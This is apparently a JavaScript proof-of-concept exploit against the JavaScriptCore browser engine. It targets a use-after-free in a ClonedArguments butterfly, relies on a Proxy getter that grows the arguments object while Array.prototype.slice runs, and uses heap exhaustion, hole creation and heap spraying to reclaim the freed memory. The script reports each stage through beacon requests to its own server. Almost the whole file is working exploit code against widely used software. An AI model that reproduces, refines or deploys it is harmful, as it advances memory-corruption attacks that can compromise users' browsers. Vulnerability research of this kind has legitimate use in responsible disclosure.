// p220d — ClonedArguments butterfly UAF via allocator exhaustion
//
// Source insight: old butterfly becomes GC garbage (not freed immediately).
// collectIfNecessaryOrDefer triggers collectAsync, not collectSync.
// Strategy: exhaust the auxiliary space's free cells so that the NEXT
// allocation from that space MUST sweep/collect to find a free cell,
// reclaiming the dead butterfly. Then our spray occupies it.
//
// The butterfly lives in jsValueGigacageAuxiliarySpace. Other Array
// butterflies are in the same space. We exhaust it by pre-allocating
// thousands of arrays, then in the trap we grow (freeing old butterfly
// to GC), then allocate more from the same space — the allocator
// eventually sweeps the dead butterfly's cell and reuses it.
//
// Beacon prefix: V220D-

(function() {
  function B(tag, body) {
    var url = '/beacon/V220D-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(String(body));
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // === Round 1: 16 args, exhaust auxiliary space before trigger ===
  function round1() {
    B('R1-START');
    var NARGS = 16;
    var HOLE_IDX = 14;

    // Phase A: Pre-exhaust the auxiliary space by allocating tons of
    // 16-element arrays (same size class as our butterfly).
    // This fills all free cells in existing MarkedBlocks for this size.
    var exhaust = [];
    var exhaust_count = 0;
    try {
      for (var i = 0; i < 200000; i++) {
        var a = new Array(NARGS);
        a[0] = i; // ensure contiguous butterfly allocation
        exhaust.push(a);
        exhaust_count++;
      }
    } catch (e) {
      B('R1-EXHAUST-OOM-' + exhaust_count);
    }
    B('R1-EXHAUST-' + exhaust_count);

    // Phase B: Free HALF to create holes in the blocks
    // but keep the other half to prevent block reclamation
    for (var i = 0; i < exhaust.length; i += 2) {
      exhaust[i] = null;
    }
    // Trigger a GC to sweep the freed cells
    var junk = [];
    for (var i = 0; i < 50000; i++) junk.push({x: i});
    junk = null;
    for (var i = 0; i < 50000; i++) junk = {x: i, y: new Array(4)};
    junk = null;
    B('R1-HOLES-MADE');

    // Phase C: Now create the arguments object. Its butterfly goes into
    // a free cell we just created.
    var reallocCount = 0;
    var sprayArrays = [];

    var args = target(
      0xAA00, 0xAA01, 0xAA02, 0xAA03,
      0xAA04, 0xAA05, 0xAA06, 0xAA07,
      0xAA08, 0xAA09, 0xAA0A, 0xAA0B,
      0xAA0C, 0xAA0D, 0xAA0E, 0xAA0F
    );
    delete args[HOLE_IDX];
    B('R1-ARGS-CREATED');

    // Phase D: Exhaust the remaining free cells, leaving very few
    var exhaust2 = [];
    try {
      for (var i = 0; i < 50000; i++) {
        var a = new Array(NARGS);
        a[0] = i + 0xFFFF;
        exhaust2.push(a);
      }
    } catch(e) {}
    B('R1-EXHAUST2-' + exhaust2.length);

    var trapHandler = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount !== 1) return 0xDEAD0000 | reallocCount;
        B('R1-TRAP-' + prop);

        // GROW: old butterfly becomes garbage. New butterfly gets a different
        // (larger) cell from a different size class.
        for (var j = NARGS; j < 3000; j++) args[j] = 0xCC;
        B('R1-GREW');

        // Now the old butterfly's cell is dead but still in a MarkedBlock.
        // The auxiliary space for 16-element size class is nearly full
        // (we exhausted it in Phase D). When we allocate more 16-element
        // arrays, the allocator will eventually need to sweep to find cells.
        // The dead butterfly's cell will be swept and reused by our spray.

        for (var s = 0; s < 100000; s++) {
          var arr = new Array(NARGS);
          for (var k = 0; k < NARGS; k++) {
            arr[k] = 0xCAFE0000 | (s & 0xFFFF);
          }
          sprayArrays.push(arr);
        }
        B('R1-SPRAY-' + sprayArrays.length);

        return 0xBEEF0001;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trapHandler));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('R1-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R1-NULL'); return; }
    B('R1-LEN-' + result.length);

    var corruptCount = 0;
    var vals = [];
    for (var i = 0; i < NARGS; i++) {
      var v = result[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      var expected = 0xAA00 + i;
      var tag;

      if (i === HOLE_IDX) {
        tag = 'H:' + hex(u);
      } else if (typeof v === 'number') {
        if (u !== expected) {
          corruptCount++;
          tag = (u >>> 16) === 0xCAFE ? 'S:' + hex(u) : '!' + hex(u);
        } else {
          tag = hex(u);
        }
      } else if (v === undefined) {
        tag = 'undef';
        corruptCount++;
      } else {
        corruptCount++;
        tag = typeof v;
      }
      vals.push(i + '=' + tag);
    }
    B('R1-VALS', vals.join(' '));
    B('R1-CORRUPT-' + corruptCount);
    if (corruptCount > 0) B('R1-UAF-CONFIRMED');

    // Cleanup
    exhaust = null;
    exhaust2 = null;
    sprayArrays = null;
  }

  // === Round 2: Same but with 32 args ===
  function round2() {
    B('R2-START');
    var NARGS = 32;
    var HOLE_IDX = 30;

    var exhaust = [];
    try {
      for (var i = 0; i < 150000; i++) {
        var a = new Array(NARGS);
        a[0] = i;
        exhaust.push(a);
      }
    } catch(e) {}
    B('R2-EXHAUST-' + exhaust.length);

    for (var i = 0; i < exhaust.length; i += 2) exhaust[i] = null;
    var jk = [];
    for (var i = 0; i < 30000; i++) jk.push(new Array(4));
    jk = null;

    var argVals = [];
    for (var i = 0; i < NARGS; i++) argVals.push(0xBB00 + i);
    var args = target.apply(null, argVals);
    delete args[HOLE_IDX];

    var exhaust2 = [];
    try {
      for (var i = 0; i < 40000; i++) {
        var a = new Array(NARGS);
        a[0] = i;
        exhaust2.push(a);
      }
    } catch(e) {}

    var reallocCount = 0;
    var sprayArrays = [];

    var trapHandler = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount !== 1) return 0xDEAD0000 | reallocCount;
        B('R2-TRAP-' + prop);
        for (var j = NARGS; j < 5000; j++) args[j] = 0xDD;
        B('R2-GREW');
        for (var s = 0; s < 80000; s++) {
          var arr = new Array(NARGS);
          for (var k = 0; k < NARGS; k++) arr[k] = 0xD0AD0000 | (s & 0xFFFF);
          sprayArrays.push(arr);
        }
        B('R2-SPRAY-' + sprayArrays.length);
        return 0xBEEF0002;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trapHandler));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('R2-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R2-NULL'); return; }
    B('R2-LEN-' + result.length);

    var corruptCount = 0;
    var vals = [];
    for (var i = 0; i < NARGS; i++) {
      var v = result[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      var expected = 0xBB00 + i;
      var tag;
      if (i === HOLE_IDX) { tag = 'H:' + hex(u); }
      else if (typeof v === 'number' && u !== expected) {
        corruptCount++;
        tag = (u >>> 16) === 0xD0AD ? 'S:' + hex(u) : '!' + hex(u);
      } else if (typeof v !== 'number') { corruptCount++; tag = typeof v; }
      else { tag = hex(u); }
      vals.push(i + '=' + tag);
    }
    B('R2-VALS', vals.join(' '));
    B('R2-CORRUPT-' + corruptCount);
    if (corruptCount > 0) B('R2-UAF-CONFIRMED');

    exhaust = null;
    exhaust2 = null;
    sprayArrays = null;
  }

  try { round1(); } catch(e) { B('R1-FATAL-' + e.message.substring(0, 40)); }
  try { round2(); } catch(e) { B('R2-FATAL-' + e.message.substring(0, 40)); }

  B('ALL-DONE');
})();
